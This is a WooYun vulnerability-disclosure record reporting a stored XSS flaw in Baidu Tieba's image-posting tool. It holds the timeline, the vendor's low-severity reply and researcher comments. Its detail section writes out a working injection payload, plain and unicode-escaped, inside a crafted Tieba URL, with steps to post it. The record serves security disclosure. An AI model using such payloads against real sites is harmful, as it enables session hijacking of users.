{"id": 10817, "wybug_id": "wooyun-2013-026849", "wybug_title": "百度贴吧存储型XSS漏洞，可劫持用户身份认证信息。", "wybug_corp": "百度", "wybug_author": "q601333824", "wybug_date": "2013-06-25 13:05", "wybug_open_date": "2013-08-09 13:06", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-09：\t细节向公众公开  简要描述： 贴图神器上传存在XSS漏洞 详细说明：  1.先构造代码:　　\"><img class=\"BDE_Smiley\" src=\"http://static.tieba.baidu.com/tb/editor/images/face/i_f01.png\" pic_ext=\"png\" width=\"30\" height=\"30\" onload=\"alert(1)\"><img src=\"#\" pic_ext=\"jpeg\" onerror=\"$(&quot;.pic_src_wrapper&quot;).css(&quot;display&quot;,&quot;none&quot;)\"><a2.然后进行转码：　\\u0022\\u003e\\u003c\\u0069\\u006d\\u0067\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0042\\u0044\\u0045\\u005f\\u0053\\u006d\\u0069\\u006c\\u0065\\u0079\\u0022\\u0020\\u0073\\u0072\\u0063\\u003d\\u0022\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063\\u002e\\u0074\\u0069\\u0065\\u0062\\u0061\\u002e\\u0062\\u0061\\u0069\\u0064\\u0075\\u002e\\u0063\\u006f\\u006d\\u002f\\u0074\\u0062\\u002f\\u0065\\u0064\\u0069\\u0074\\u006f\\u0072\\u002f\\u0069\\u006d\\u0061\\u0067\\u0065\\u0073\\u002f\\u0066\\u0061\\u0063\\u0065\\u002f\\u0069\\u005f\\u0066\\u0030\\u0031\\u002e\\u0070\\u006e\\u0067\\u0022\\u0020\\u0070\\u0069\\u0063\\u005f\\u0065\\u0078\\u0074\\u003d\\u0022\\u0070\\u006e\\u0067\\u0022\\u0020\\u0077\\u0069\\u0064\\u0074\\u0068\\u003d\\u0022\\u0033\\u0030\\u0022\\u0020\\u0068\\u0065\\u0069\\u0067\\u0068\\u0074\\u003d\\u0022\\u0033\\u0030\\u0022\\u0020\\u006f\\u006e\\u006c\\u006f\\u0061\\u0064\\u003d\\u0022\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029\\u0022\\u003e\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0022\\u0023\\u0022\\u0020\\u0070\\u0069\\u0063\\u005f\\u0065\\u0078\\u0074\\u003d\\u0022\\u006a\\u0070\\u0065\\u0067\\u0022\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0022\\u0024\\u0028\\u0026\\u0071\\u0075\\u006f\\u0074\\u003b\\u002e\\u0070\\u0069\\u0063\\u005f\\u0073\\u0072\\u0063\\u005f\\u0077\\u0072\\u0061\\u0070\\u0070\\u0065\\u0072\\u0026\\u0071\\u0075\\u006f\\u0074\\u003b\\u0029\\u002e\\u0063\\u0073\\u0073\\u0028\\u0026\\u0071\\u0075\\u006f\\u0074\\u003b\\u0064\\u0069\\u0073\\u0070\\u006c\\u0061\\u0079\\u0026\\u0071\\u0075\\u006f\\u0074\\u003b\\u002c\\u0026\\u0071\\u0075\\u006f\\u0074\\u003b\\u006e\\u006f\\u006e\\u0065\\u0026\\u0071\\u0075\\u006f\\u0074\\u003b\\u0029\\u0022\\u003e\\u003c\\u00613.http://tieba.baidu.com/photo/shenqi?title=&src=http%3A%2F%2Fwww.baidu.com%2Fp%2F%25E5%258D%2596%25E8%2590%258C%25E7%259A%2584%25E4%25B8%25AD%25E4%25BA%258C%3Ffrom%3Dsuper&pic[0]=http%3A%2F%2Fhimg.bdimg.com%2Fsys%2Fportrait%2Fitem%2Fc22ce58d96e8908ce79a84e4b8ade4ba8c0334.jpg 　(这个是贴吧神器地址)4.讲构造好的代码放入&src=连接的后面\n\n5.得到http://tieba.baidu.com/photo/shenqi?title=&src=http%3A%2F%2Fwww.baidu.com%2Fp%2F%25E5%258D%2596%25E8%2590%258C%25E7%259A%2584%25E4%25B8%25AD%25E4%25BA%258C%3Ffrom%3Dsuper\\u0022\\u003e\\u003c\\u0069\\u006d\\u0067\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0042\\u0044\\u0045\\u005f\\u0053\\u006d\\u0069\\u006c\\u0065\\u0079\\u0022\\u0020\\u0073\\u0072\\u0063\\u003d\\u0022\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063\\u002e\\u0074\\u0069\\u0065\\u0062\\u0061\\u002e\\u0062\\u0061\\u0069\\u0064\\u0075\\u002e\\u0063\\u006f\\u006d\\u002f\\u0074\\u0062\\u002f\\u0065\\u0064\\u0069\\u0074\\u006f\\u0072\\u002f\\u0069\\u006d\\u0061\\u0067\\u0065\\u0073\\u002f\\u0066\\u0061\\u0063\\u0065\\u002f\\u0069\\u005f\\u0066\\u0030\\u0031\\u002e\\u0070\\u006e\\u0067\\u0022\\u0020\\u0070\\u0069\\u0063\\u005f\\u0065\\u0078\\u0074\\u003d\\u0022\\u0070\\u006e\\u0067\\u0022\\u0020\\u0077\\u0069\\u0064\\u0074\\u0068\\u003d\\u0022\\u0033\\u0030\\u0022\\u0020\\u0068\\u0065\\u0069\\u0067\\u0068\\u0074\\u003d\\u0022\\u0033\\u0030\\u0022\\u0020\\u006f\\u006e\\u006c\\u006f\\u0061\\u0064\\u003d\\u0022\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029\\u0022\\u003e\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0022\\u0023\\u0022\\u0020\\u0070\\u0069\\u0063\\u005f\\u0065\\u0078\\u0074\\u003d\\u0022\\u006a\\u0070\\u0065\\u0067\\u0022\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0022\\u0024\\u0028\\u0026\\u0071\\u0075\\u006f\\u0074\\u003b\\u002e\\u0070\\u0069\\u0063\\u005f\\u0073\\u0072\\u0063\\u005f\\u0077\\u0072\\u0061\\u0070\\u0070\\u0065\\u0072\\u0026\\u0071\\u0075\\u006f\\u0074\\u003b\\u0029\\u002e\\u0063\\u0073\\u0073\\u0028\\u0026\\u0071\\u0075\\u006f\\u0074\\u003b\\u0064\\u0069\\u0073\\u0070\\u006c\\u0061\\u0079\\u0026\\u0071\\u0075\\u006f\\u0074\\u003b\\u002c\\u0026\\u0071\\u0075\\u006f\\u0074\\u003b\\u006e\\u006f\\u006e\\u0065\\u0026\\u0071\\u0075\\u006f\\u0074\\u003b\\u0029\\u0022\\u003e\\u003c\\u0061&pic[0]=http%3A%2F%2Fhimg.bdimg.com%2Fsys%2Fportrait%2Fitem%2Fc22ce58d96e8908ce79a84e4b8ade4ba8c0334.jpg6.然后回复或者发布主题，可以产生XSS\n\n   漏洞证明：  \n\n\n\n   修复方案：  过滤符号\"\\\"(能给个邀请码吗)   版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2013-06-25 13:52 厂商回复： 感谢提交，该漏洞我们已内部监控发现，正在处理中。再次感谢您的反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-25 13:06 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  卧槽，这个难道是绕过了百度贴吧的过滤机制？洞主牛淫！    \n     2013-06-25 13:08 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  路人甲永远是那么奇葩    \n     2013-06-25 14:20 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  。。。劫持信息没啥用，来一句可蠕虫吓吓百度233    \n     2013-06-25 15:51 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:217 漏洞数:49        | 出自《丹特丽安的书架》---吾问汝,汝为人否...)\t\t \n  于是乎 就这样我就得到了梦寐以求的激活码>< 纪念一下    \n     2013-06-25 17:01 |    \t\txcfres54 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:3        )\t\t \n  好流弊的样子。。    \n     2013-06-26 08:10 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  内部监控发现？    \n     2013-06-26 10:58 |    \t\t天际 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 我只是在打酱油)\t\t \n  @q601333824 你在卖萌= -！这句话不是我说的么··    \n     2013-06-29 01:43 |    \t\tretaker \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | free open share)\t\t \n  呵呵    \n     2013-08-09 13:15 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  感谢提交，该漏洞我们已内部监控发现，就是洞主在构造的过程中发现的吧。    \n     2013-08-19 04:41 |    \t\tredcar \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 找到组织了！)\t\t \n  @LaiX 哈哈，有可能。然后度娘就说老娘有流弊的防火墙，然后这个很厉害的rank（洞主自评10，人家都没好意思多要）瞬间就变成1了。    \n     2013-12-16 18:38 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @q601333824 能解释一下原理不    \n     2013-12-17 12:36 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:217 漏洞数:49        | 出自《丹特丽安的书架》---吾问汝,汝为人否...)\t\t \n  javascript:void((function(){var e=document.createElement(\"script\");e.setAttribute(\"id\",\"bdtbmarklet\");e.setAttribute(\"type\",\"text/javascript\");e.setAttribute(\"charset\",\"UTF-8\");e.setAttribute(\"src\",\"http://static.tieba.baidu.com/tb/static-album/lib/bdtbmarklet.js?r=\"+Math.random()*99999999);document.body.appendChild(e)})());  贴图神器靠这个脚本执行的....就试试\\x22了    \n     2013-12-17 12:55 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @q601333824 感谢回复。虽然不是很懂。是因为src属性是js生成的。所以尝试js编码么。    \n     2014-02-01 10:57 |    \t\tretaker \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | free open share)\t\t \n  呵呵，又他妈内部监控，下回你们内部监控发现我蠕虫再说@xsser    \n     2014-02-01 12:41 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  @retaker 好赞顶    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}